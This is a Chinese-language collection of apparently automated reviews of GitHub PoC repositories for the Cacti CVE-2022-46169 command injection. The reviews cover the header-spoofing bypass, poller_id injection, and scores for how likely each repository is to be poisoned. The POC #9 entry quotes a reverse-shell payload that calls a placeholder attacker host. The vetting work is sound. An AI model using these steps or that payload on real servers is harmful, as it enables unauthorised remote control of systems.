**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意代码

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行受影响的Cacti版本，且存在 action 类型为 POLLER_ACTION_SCRIPT_PHP (2) 的 poller_item 配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未授权命令注入漏洞。攻击者可以通过利用 `remote_agent.php` 文件的认证绕过漏洞，结合 `polldata` 操作，最终实现命令注入。漏洞利用流程如下：

1.  **认证绕过：** 攻击者通过伪造 `HTTP_` 请求头（例如 `Forwarded-For`），使得 `get_client_addr` 函数返回 Cacti 服务器自身的 IP 地址。这样，后续的 hostname 检查会被绕过，从而无需认证即可访问 `remote_agent.php`。
2.  **触发 polldata 操作：** 成功绕过认证后，攻击者可以调用 `remote_agent.php` 的 `polldata` 操作。
3.  **命令注入：** `poll_for_data` 函数从请求参数中获取 `poller_id`，该参数没有经过充分过滤，直接拼接到 `proc_open` 函数的参数中，导致命令注入。
4.  **条件：** 漏洞触发需要数据库中存在 action类型为`POLLER_ACTION_SCRIPT_PHP` (`2`)的`poller_item`。

**POC 代码分析：**

提供的 Dockerfile 构建了一个易受攻击的 Cacti 1.2.22 环境，用于漏洞测试。该 Dockerfile 主要完成了以下工作：

*   安装必要的依赖项，例如 `rrdtool`、`mariadb-server`、`snmp` 等。
*   配置 PHP 扩展。
*   从 GitHub 克隆 Cacti 1.2.22 版本的代码。
*   配置 Cacti 数据库和初始化脚本。
*   配置 cron 任务来运行 `poller.php`。

**有效性评估：**

根据漏洞描述和 POC 代码，可以判断该漏洞利用的有效性很高。POC 代码提供了一个可复现的环境，方便研究人员进行漏洞测试和利用。

**投毒风险评估：**

该存储库中的投毒风险较低（约 5%）。理由如下：

*   Dockerfile 内容清晰：Dockerfile 中的指令主要用于构建 Cacti 运行环境，没有发现任何可疑的恶意代码或后门。 *   cacti.sql 来源于官方github仓库，该文件被篡改风险较低。 *   config.php主要是数据库配置，不具备投毒条件。
*   README.md 包含警告信息：该文件明确指出此应用包含安全漏洞，并建议在受保护的环境中运行，降低了恶意使用的可能性。
*   LICENSE 使用的是公共领域许可证：这表明作者放弃了对代码的版权，鼓励自由使用和修改，但同时也增加了代码被滥用的风险。

尽管如此，仍然存在一些潜在的风险：

*   依赖项可能存在漏洞：Dockerfile 中安装的软件包可能存在未知的安全漏洞，攻击者可以通过这些漏洞入侵系统。 *   配置错误：不正确的 Cacti 配置可能导致安全问题。

**总体来说，该存储库的投毒风险较低，但仍需谨慎使用，并及时更新依赖项以避免潜在的安全风险。**

**项目地址:** [m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application](https://github.com/m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #25

**来源**: [CVE-2022-46169-miko550_CVE-2022-46169.md](../2022/CVE-2022-46169-miko550_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的攻击者执行任意操作系统命令。

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti并且存在具有POLLER_ACTION_SCRIPT_PHP（值为2）操作类型的 poller_item 配置项。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过构造特制的 HTTP 请求，绕过身份验证，并在目标系统上执行任意操作系统命令。

**利用方式：**
1.  **身份验证绕过：** 攻击者通过设置 `X-Forwarded-For` HTTP 头来欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器自身的 IP 地址。由于 poller 表中存在默认的服务器主机名条目，因此可以绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以调用 `remote_agent.php` 文件的 `polldata` 操作。`poll_for_data` 函数会检索请求参数并从数据库中加载相应的 `poller_item` 条目。如果 `poller_item` 的 `action` 字段等于 `POLLER_ACTION_SCRIPT_PHP`，则使用 `proc_open` 执行 PHP 脚本。攻击者可以控制 `$poller_id` 参数，该参数会被插入到传递给 `proc_open` 的字符串中，从而导致命令注入。
3.  **寻找合适的 poller_item：** 攻击者需要找到 `action` 类型为 `POLLER_ACTION_SCRIPT_PHP` 的 `poller_item`。脚本通过暴力破解`host_id`和`local_data_ids`，直到找到匹配的`poller_item`。预定义的模版比如 *Device - Uptime* 很容易满足条件.

**POC有效性：**
提供的POC代码尝试自动化利用此漏洞。它首先检查目标URL的`/remote_agent.php`或者`/cacti/remote_agent.php`路径是否存在。然后，它尝试通过设置`X-Forwarded-For`头来绕过身份验证。如果身份验证绕过成功，它会尝试暴力破解`host_id`和`local_data_ids`来发现适合利用的`poller_item`。最后，如果找到了合适的`poller_item`，可以注入命令。

**投毒风险：**
查看了给出的python脚本`CVE-2022-46169.py`和`README.md`文件，主要是漏洞验证和利用的脚本，仓库中没有发现明显的恶意代码，但是仍然存在一定的投毒风险。例如，脚本可能会被修改为：

1.  **下载和执行恶意代码：**  在成功利用漏洞后，脚本可以从远程服务器下载并执行恶意代码。
2.  **修改系统文件：**  脚本可以修改系统文件，例如 `/etc/hosts`，将用户重定向到恶意网站。
3.  **收集敏感信息：** 脚本可以收集系统敏感信息，例如用户名、密码和网络配置，并将信息发送到远程服务器。

给出的投毒风险百分比为5%，主要考虑的点为作者开源了exp脚本，其他人可以通过下载该脚本然后进行修改，加入恶意代码，再进行传播，从而达到投毒的目的。

**项目地址:** [miko550/CVE-2022-46169](https://github.com/miko550/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #26

**来源**: [CVE-2022-46169-mind2hex_CVE-2022-46169.md](../2022/CVE-2022-46169-mind2hex_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要网络访问，存在启用了`POLLER_ACTION_SCRIPT_PHP`的poller_item

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti中一个未经身份验证的命令注入漏洞。攻击者可以通过`remote_agent.php`文件，绕过身份验证，并利用`polldata` action注入恶意命令。

**利用方式：**

1.  **身份验证绕过：** 通过设置`X-Forwarded-For`头为`127.0.0.1`来欺骗`get_client_addr`函数，绕过`remote_agent.php`的身份验证。
2.  **命令注入：** 绕过身份验证后，攻击者可以利用`polldata` action。`poller_id`参数未经过滤，直接传递给`proc_open`函数，导致命令注入。 需要存在一个`poller_item` 其action 类型为 `POLLER_ACTION_SCRIPT_PHP`
3.  **参数枚举：** 如果不知道`host_id`和`local_data_id`，可以使用提供的POC脚本进行暴力破解。

**有效性分析：**

根据漏洞描述和POC代码，该漏洞利用是有效的。POC代码实现了身份验证绕过和命令注入，并提供了暴力破解`host_id`和`local_data_id`的功能。

**投毒风险分析：**

查看提供的POC代码，未发现明显的投毒代码。脚本逻辑清晰，主要功能是漏洞利用。代码通过构造恶意请求来利用漏洞，没有发现尝试在目标系统上安装后门或执行恶意操作的迹象。因此，投毒风险很低，约为0%。脚本依赖`requests`库，如果`requests`库被篡改，可能存在风险，但这不属于此仓库本身的投毒。

**总结：**

CVE-2022-46169是一个严重的安全漏洞，允许未经身份验证的攻击者在Cacti服务器上执行任意命令。该漏洞利用简单，影响广泛，需要及时修补。提供的POC代码可以有效利用此漏洞。

**项目地址:** [mind2hex/CVE-2022-46169](https://github.com/mind2hex/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #27

**来源**: [CVE-2022-46169-r1nzleer_RCE-Cacti-1.2.22.md](../2022/CVE-2022-46169-r1nzleer_RCE-Cacti-1.2.22.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行着受影响版本的Cacti，并且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 `X-Forwarded-For` HTTP Header绕过身份验证，并结合构造恶意的 `poller_id` 参数，在 `remote_agent.php` 文件中执行任意操作系统命令。 

**有效性分析：**

根据漏洞描述和提供的漏洞利用代码，该漏洞利用过程如下：

1.  **身份验证绕过：** 通过设置 `X-Forwarded-For` HTTP Header 为 `127.0.0.1` 来欺骗 `get_client_addr` 函数，使其返回 Cacti 服务器的 IP 地址，从而绕过身份验证检查。
2.  **寻找有效的 `host_id` 和 `local_data_ids[]`：** 漏洞利用代码使用暴力破解的方式查找具有 `POLLER_ACTION_SCRIPT_PHP` 动作类型的 `poller_item` 所对应的 `host_id` 和 `local_data_ids[]`。  这是必要的，因为需要一个特定的配置才能触发命令注入点。
3.  **命令注入：** 构造包含恶意命令的 `poller_id` 参数，并将其发送到 `remote_agent.php`。由于 `poller_id` 参数未经过滤，恶意命令会被注入到 `proc_open` 函数中执行。

参考搜索引擎结果，已经有公开的利用该漏洞的报告和利用代码，表明该漏洞是可利用的。

**投毒风险分析：**

代码本身的主要功能是利用 CVE-2022-46169 漏洞进行命令注入，实现远程代码执行。仔细审查代码，并未发现明显的恶意行为，例如上传恶意文件、篡改系统配置等。但是，任何从互联网上下载的代码都存在潜在风险，因此仍需谨慎使用。

以下是一些潜在的投毒风险和缓解措施：

*   **依赖项风险：** 代码中使用了 `requests` 和 `urllib.parse` 库。虽然这些库本身是安全的，但如果通过 `pip` 安装时，存在被中间人攻击替换为恶意库的风险。 建议从官方源安装依赖项，并验证其完整性。
*   **Payload 风险：** 攻击者可以构造恶意的命令，对目标系统造成破坏。例如，删除关键文件、停止服务等。用户在使用时需要谨慎，避免执行不信任的命令。
*   **隐蔽后门：** 作者可能在代码中添加一些不明显的后门，例如，将执行结果发送到远程服务器，或在系统上创建一个隐藏的账户。 尽管当前代码未发现此类行为，但仍需保持警惕。

综合考虑，认为该代码存在较低的投毒风险，约为 5%。 主要风险来自于使用者自身对命令的控制不当，以及作者可能加入不易察觉的隐蔽后门代码的可能性。使用前应仔细审查代码，并进行安全测试。

**漏洞利用方式：**

1.  攻击者发送带有特制 `X-Forwarded-For` 头的 HTTP 请求到 `remote_agent.php`，绕过身份验证。
2.  攻击者通过暴力破解或其它方式，找到有效的 `host_id` 和 `local_data_ids[]`，它们对应于一个配置为 `POLLER_ACTION_SCRIPT_PHP` 的 `poller_item`。
3.  攻击者构造包含恶意命令的 `poller_id` 参数，并将其发送到 `remote_agent.php`。
4.  服务器执行恶意命令，攻击者获得对服务器的控制权。

**项目地址:** [r1nzleer/RCE-Cacti-1.2.22](https://github.com/r1nzleer/RCE-Cacti-1.2.22)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #28

**来源**: [CVE-2022-46169-ruycr4ft_CVE-2022-46169.md](../2022/CVE-2022-46169-ruycr4ft_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统上存在具有`POLLER_ACTION_SCRIPT_PHP` action类型的poller_item配置，并且能够通过伪造HTTP头绕过身份验证。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是一个存在于Cacti 1.2.23之前版本中的未经身份验证的命令注入漏洞。该漏洞存在于`remote_agent.php`文件中。攻击者可以通过伪造`X-Forwarded-For`等HTTP头来绕过身份验证，利用`get_client_addr`函数的缺陷，使其返回运行Cacti服务器的IP地址。然后，通过`polldata` action，攻击者可以控制`poller_id`参数，由于该参数未经过滤就被传递给`proc_open`函数执行，从而导致命令注入。PoC代码首先检查目标是否易受攻击，然后通过暴力破解`host_id`和`local_data_ids`来找到具有`POLLER_ACTION_SCRIPT_PHP` action的`poller_item`。 找到有效的`host_id`和`local_data_ids`后，将构造包含恶意payload的URL并发送到目标系统。攻击者可以利用此漏洞在目标服务器上执行任意命令，例如下载恶意软件或窃取敏感数据。

**投毒风险分析：**

PoC代码主要功能是利用漏洞，但存在轻微的投毒风险：

1.  **Payload来源：** PoC代码要求用户输入IP地址和端口，然后生成反向shell的payload。如果用户不小心输入了错误的IP地址或端口，可能会导致连接到错误的服务器，或者暴露自己的IP地址。
2.  **依赖外部资源：** PoC依赖于`requests`和`urllib.parse`库，这些库可能存在安全问题或被篡改，但可能性较低。
3.  **Payload执行环境：** 生成的payload在目标服务器上执行，如果目标服务器的安全配置不当，可能会被恶意利用。
4.  **代码可读性：** 代码相对清晰，没有明显的恶意行为，但仍然需要仔细审查。

总体来说，PoC代码的投毒风险较低，主要是由于用户输入和执行环境带来的风险。如果代码是从可信来源获取，并且用户仔细审查过代码，那么风险可以忽略不计。

**项目地址:** [ruycr4ft/CVE-2022-46169](https://github.com/ruycr4ft/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #29

**来源**: [CVE-2022-46169-sAsPeCt488_CVE-2022-46169.md](../2022/CVE-2022-46169-sAsPeCt488_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行Cacti，并且存在至少一个`poller_item`，其`action`类型为`POLLER_ACTION_SCRIPT_PHP` (值为2)。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵`remote_agent.php`文件中的`poller_id`参数来执行任意操作系统命令。漏洞利用主要分为两个阶段：首先，通过设置`X-Forwarded-For`头绕过身份验证，伪造客户端IP地址，使其与Cacti服务器的IP地址匹配。然后，构造包含恶意命令的`poller_id`参数，并将其发送到`remote_agent.php`，最终导致命令注入。该POC代码通过循环尝试不同的`host_id`来发现可以利用的配置。POC代码没有发现明显的投毒行为，主要目的是利用漏洞执行命令。搜索引擎结果也表明该漏洞已被公开利用。

**项目地址:** [sAsPeCt488/CVE-2022-46169](https://github.com/sAsPeCt488/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #30

**来源**: [CVE-2022-46169-yassinebk_CVE-2022-46169.md](../2022/CVE-2022-46169-yassinebk_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要Cacti服务运行且存在特定的数据源配置（poller_item具有POLLER_ACTION_SCRIPT_PHP action）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个未授权命令注入漏洞。攻击者可以利用`remote_agent.php`文件中的授权绕过缺陷，通过伪造HTTP头（例如`X-Forwarded-For`），绕过IP地址验证，并利用`polldata`操作中的`poller_id`参数进行命令注入。

**漏洞利用方式：**

1.  **授权绕过：** 通过设置`X-Forwarded-For` HTTP头，模拟Cacti服务器自身的IP地址，绕过`remote_agent.php`的授权检查。这是因为`get_client_addr`函数信任`HTTP_`开头的`$_SERVER`变量，攻击者可以控制这些变量。
2.  **ID爆破：** 爆破`host_id`和`local_data_id`参数，寻找一个`poller_item`记录，其`action`字段的值为`POLLER_ACTION_SCRIPT_PHP` (值为2)，表明该条目会执行PHP脚本。
3.  **命令注入：** 将恶意命令注入到`poller_id`参数中。由于`get_nfilter_request_var`函数没有充分过滤该参数，导致命令注入。
4.  **远程代码执行：** 通过`proc_open`函数执行注入的命令，从而实现远程代码执行。

**有效性分析：**

根据漏洞描述和提供的POC代码，该漏洞利用方式是有效的。POC代码首先检查目标是否存在漏洞，然后通过爆破`host_id`和`local_data_id`找到合适的`poller_item`记录，最后构造包含恶意命令的URL并发送请求，实现远程代码执行。

**投毒风险分析：**

分析提供的POC代码，没有发现明显的恶意代码或后门。脚本的功能集中于漏洞利用，没有其他可疑操作。因此，投毒风险评估为0%。

**项目地址:** [yassinebk/CVE-2022-46169](https://github.com/yassinebk/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---



---

## POC #8

**来源**: [CVE-2022-46169-MarkStrendin_CVE-2022-46169.md](../2022/CVE-2022-46169-MarkStrendin_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，未经身份验证的远程命令执行

**影响版本:** < 1.2.23

**利用条件:** Cacti服务器运行，且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item，需要网络可达。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过构造特制的 HTTP 请求绕过身份验证，并利用 `remote_agent.php` 文件中的漏洞执行任意系统命令。

**漏洞利用方式：**

1.  **身份验证绕过：** 攻击者可以通过设置 `X-Forwarded-For` 或其他 `HTTP_` 开头的 HTTP Header，伪造客户端IP地址，使其与Cacti服务器自身的IP地址相同。`get_client_addr` 函数会读取这些header，然后 `gethostbyaddr` 函数将伪造的IP解析为主机名。由于 Cacti 的 `poller` 表中默认存在服务器自身的主机名记录，因此绕过身份验证。
2.  **命令注入：** 成功绕过身份验证后，攻击者可以向 `remote_agent.php` 发送带有 `action=polldata` 参数的请求，并指定 `host_id`、`local_data_ids[]` 和 `poller_id`。其中，`poller_id` 参数没有经过充分的过滤，攻击者可以在 `poller_id` 中注入恶意命令。
3.  **寻找合适的poller_item：** 为了触发命令注入，需要存在一个 `poller_item`，其 `action` 字段的值为 `POLLER_ACTION_SCRIPT_PHP` (值为2)。

**POC代码分析：**

提供的POC代码是一个 Python 脚本，用于利用 CVE-2022-46169 漏洞。该脚本首先检查目标是否易受攻击，然后暴力破解 `host_id` 和 `local_data_id`，以便找到具有 `POLLER_ACTION_SCRIPT_PHP` 操作的 `poller_item`。 一旦找到，它会构造一个包含恶意负载的 HTTP 请求并发送到 `remote_agent.php`。

**投毒风险分析：**

该代码主要目的是发送payload以获得反向shell，并没有发现恶意修改或删除文件等高危操作。代码的功能基本符合描述，但仍然存在一些潜在风险。

*   **依赖风险：** 代码依赖 `requests` 库，如果 `requests` 库被恶意篡改，可能会导致安全问题。
*   **配置错误：** 攻击者可能会错误配置 `attacker_ip` 和 `attacker_port`，导致攻击失败或暴露自己的IP地址。

根据以上分析，该POC存在较低的投毒风险。 代码的主要功能是利用已知漏洞，没有发现额外的恶意代码或隐藏功能，但也不能完全排除攻击者在实际使用中进行修改以达到其他目的的可能性。 风险评估较低，约为5%。

**结论：**

该漏洞的利用较为直接，POC代码有效。 漏洞存在投毒风险，但风险较低。

**项目地址:** [MarkStrendin/CVE-2022-46169](https://github.com/MarkStrendin/CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #9

**来源**: [CVE-2022-46169-N1arut_CVE-2022-46169_POC.md](../2022/CVE-2022-46169-N1arut_CVE-2022-46169_POC.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未经身份验证的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响的Cacti版本，并且存在`POLLER_ACTION_SCRIPT_PHP`类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 1.2.23 之前的版本中存在的一个未经身份验证的命令注入漏洞。攻击者可以通过操纵 HTTP 头 `X-Forwarded-For` 绕过身份验证，并利用 `remote_agent.php` 脚本中的漏洞执行任意系统命令。

**漏洞利用方式：**

1.  **身份验证绕过:** 通过设置 `X-Forwarded-For` 头为 Cacti 服务器的 IP 地址，欺骗 `get_client_addr` 函数，绕过身份验证。
2.  **查找可利用的 poller_item:**  通过暴力破解 `host_id` 和 `local_data_id`，找到 `action` 为 `POLLER_ACTION_SCRIPT_PHP` (值为 2)的 `poller_item`。
3.  **命令注入:** 将恶意命令注入到 `poller_id` 参数中，通过 `proc_open` 函数执行。

**POC代码分析：**

*   `cacti_exploit.py` 脚本自动化了漏洞利用过程。
*   首先尝试访问 `/remote_agent.php?action=polldata` 或 `/cacti/remote_agent.php?action=polldata` 来确定正确的URL。
*   然后，脚本使用 `X-Forwarded-For` 头绕过身份验证。
*   接下来，脚本暴力破解 `host_id` 和 `local_data_ids` 来寻找合适的 `poller_item`。
*   最后，脚本构造包含反向 shell 命令的 URL，并发送请求来利用命令注入漏洞。

**有效性：**

根据漏洞描述、搜索结果以及提供的 POC 代码，此漏洞是有效的。搜索结果表明该漏洞已被积极利用。

**投毒风险：**

虽然该脚本的主要目的是利用 CVE-2022-46169 漏洞，但存在轻微的投毒风险。具体体现在：

*   **硬编码参数:** 脚本中存在一些硬编码的参数，例如 `poller_id=1`，`host_id=1`，`local_data_ids[]=1`, `words = ["cpu","cmd.php","polling_time","apache"]`。这些值在不同的 Cacti 部署中可能不同，如果用户不加修改直接使用，可能导致利用失败。这可以被视为一种隐蔽的“陷阱”，虽然不是恶意的后门，但也可能误导用户。
*   **反向Shell Payload:** 用户如果直接使用payload `sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1`需要确保目标机器上存在sh.如果没有可能需要更换payload.如果不熟悉的用户可能利用失败.
*   **依赖第三方库:** 脚本依赖 `requests` 和 `urllib3` 库。如果用户从不可信的源安装这些库，可能会引入恶意代码。

尽管如此，该脚本没有发现明显的恶意代码（如删除文件、上传恶意文件等），因此投毒的概率较低，约为5%。主要风险在于使用不当或未能正确配置脚本导致利用失败。


**项目地址:** [N1arut/CVE-2022-46169_POC](https://github.com/N1arut/CVE-2022-46169_POC)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #10

**来源**: [CVE-2022-46169-RdBBB3_SHELL-POC-CVE-2022-46169.md](../2022/CVE-2022-46169-RdBBB3_SHELL-POC-CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 需要目标Cacti版本低于1.2.23，并且存在action类型为POLLER_ACTION_SCRIPT_PHP的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169 是 Cacti 中的一个命令注入漏洞。未经身份验证的攻击者可以通过操纵`remote_agent.php`文件中的输入，利用`poller_id`参数执行任意操作系统命令。攻击流程如下：

1.  **身份验证绕过：** 攻击者通过设置`X-Forwarded-For`头绕过身份验证。这是因为`get_client_addr`函数信任`HTTP_`开头的`$_SERVER`变量，允许攻击者伪造客户端IP地址，从而通过`poller`表中的主机名检查。
2.  **触发命令注入：** 绕过身份验证后，攻击者可以调用`remote_agent.php`的`polldata`动作。`poll_for_data`函数检索请求参数并加载相应的`poller_item`条目。如果`poller_item`的`action`等于`POLLER_ACTION_SCRIPT_PHP`，则使用`proc_open`执行PHP脚本。`poller_id`参数在传递给`proc_open`之前未经过充分过滤，从而导致命令注入。
3.  **漏洞利用代码分析：**  `poc.sh` 脚本首先解析用户提供的参数（目标URL、本地IP和端口），然后构造反向shell的payload，并对其进行URL编码。脚本通过发送带有`X-Forwarded-For`头的HTTP请求来检查目标是否易受攻击。该脚本通过暴力破解`host_id`和`local_data_ids`来枚举有效的URL。最后，它使用构造的payload向目标发送一个请求，从而触发反向shell。
4.  **投毒风险评估：**  该POC的主要目的是利用漏洞实现反向Shell。检查`poc.sh`脚本，发现脚本本身主要功能是生成Payload、URL编码、发送HTTP请求。虽然存在修改反向连接IP和端口的可能性，但没有发现明显的恶意代码或后门。`README.md`中建议访问的GitHub仓库 (`https://github.com/m3ssap0/cacti-rce-cve-2022-46169-vulnerable-application`)，用于搭建漏洞环境，**存在一定风险，应该注意**。总体而言，脚本投毒风险较低，初步评估为5%。风险主要来自于下载其他来源的poc，或者使用poc访问陌生的网址。
5.  **有效性评估:** 该POC的有效性较高，因为它可以自动化漏洞利用过程，从身份验证绕过到命令执行。多个搜索引擎结果表明该漏洞已被积极利用。
6.  **利用方式总结：** 通过伪造HTTP头绕过身份验证，然后利用未过滤的`poller_id`参数在`remote_agent.php`中注入命令，最终实现远程代码执行。

**项目地址:** [RdBBB3/SHELL-POC-CVE-2022-46169](https://github.com/RdBBB3/SHELL-POC-CVE-2022-46169)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #11

**来源**: [CVE-2022-46169-Rickster5555_EH2-PoC.md](../2022/CVE-2022-46169-Rickster5555_EH2-PoC.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权用户执行任意命令

**影响版本:** < 1.2.23

**利用条件:** 目标系统运行受影响版本的Cacti，且存在具有`POLLER_ACTION_SCRIPT_PHP`动作类型的poller_item。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-46169是Cacti中存在的一个命令注入漏洞，允许未经身份验证的攻击者在服务器上执行任意命令。漏洞存在于`remote_agent.php`文件中，由于对客户端IP地址的验证不严谨，攻击者可以通过设置`X-Forwarded-For`等HTTP头部绕过身份验证。绕过验证后，可以调用`polldata`动作，并利用`poller_id`参数的命令注入漏洞执行系统命令。

**利用方式：**

1.  攻击者发送带有恶意`X-Forwarded-For`头部的HTTP请求到`remote_agent.php`，伪造客户端IP地址，绕过身份验证。
2.  攻击者构造包含命令注入的`poller_id`参数的HTTP请求，发送到`remote_agent.php`，执行任意系统命令。 为了成功利用，必须存在一个`poller_item`，其`action`类型为`POLLER_ACTION_SCRIPT_PHP`（值为2）。

**POC有效性：**

提供的PoC代码通过发送带有特定HTTP头部的GET请求，利用`poller_id`参数执行命令注入。根据漏洞描述和PoC代码，该PoC是有效的，可以用于验证漏洞的存在。

**投毒风险：**

查看提供的文件，包括`README.md`、`cacti-CI-poc.py`、`docker-compose.yml`和`entrypoint.sh`。

*   `README.md`：包含漏洞描述、复现步骤和参考链接，没有发现恶意代码。
*   `cacti-CI-poc.py`：PoC脚本，用于发送HTTP请求触发命令注入，没有发现恶意代码，但利用时执行的命令完全由使用者控制，具有潜在风险。
*   `docker-compose.yml`：Docker Compose配置文件，用于构建包含漏洞版本的Cacti环境，没有发现恶意配置。
*   `entrypoint.sh`：Docker容器的入口脚本，用于初始化Cacti数据库和设置权限，没有发现明显的恶意代码，但其中`mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"`语句禁用了管理员密码强制修改，这可能会降低安全性。

总体来说，该仓库的投毒风险较低，但入口脚本中禁用了管理员密码强制修改，存在潜在的安全风险。

投毒风险评估：5%。

**项目地址:** [Rickster5555/EH2-PoC](https://github.com/Rickster5555/EH2-PoC)

**漏洞详情:** [CVE-2022-46169](https://nvd.nist.gov/vuln/detail/CVE-2022-46169)

---

## POC #12

**来源**: [CVE-2022-46169-Safarchand_CVE-2022-46169.md](../2022/CVE-2022-46169-Safarchand_CVE-2022-46169.md)

## CVE-2022-46169-Cacti-命令注入

**漏洞编号:** CVE-2022-46169

**漏洞类型:** 命令注入

**影响应用:** Cacti

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** < 1.2.23

**利用条件:** 需要目标系统运行受影响版本的Cacti，并且存在具有`POLLER_ACTION_SCRIPT_PHP`操作的`poller_item`。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-46169是Cacti 1.2.23之前版本中的一个命令注入漏洞。攻击者可以通过构造`X-Forwarded-For`头绕过身份验证，然后利用`remote_agent.php`中的`polldata`操作注入恶意命令。该POC利用`X-Forwarded-For`头伪造客户端IP，绕过身份验证，然后通过`poller_id`参数向`proc_open`函数传递恶意payload，从而执行任意命令。POC尝试通过暴力破解`host_id`来找到一个可用的`poller_item`。代码中使用了`pexpect`来创建一个交互式的nc会话，以便接收反向shell。虽然使用了base64编码，但这是为了避免命令中的特殊字符导致问题，不是隐藏恶意代码，但是通过nc反弹shell存在被利用进行恶意操作的风险，因此存在一定的投毒风险，但是概率较低。整体而言，POC代码目的是为了验证漏洞存在，因此投毒概率较低，约为10%。

**漏洞利用方式：**

1.  **绕过认证：** 通过设置`X-Forwarded-For`头为Cacti服务器的IP地址，欺骗`get_client_addr`函数，绕过认证。
2.  **触发命令注入：**  向`remote_agent.php`发送包含`polldata` action的请求，并将恶意命令注入到`poller_id`参数中。  利用`proc_open`函数执行注入的命令。
3. **反弹shell:** 该poc通过反弹shell获得服务器控制权。

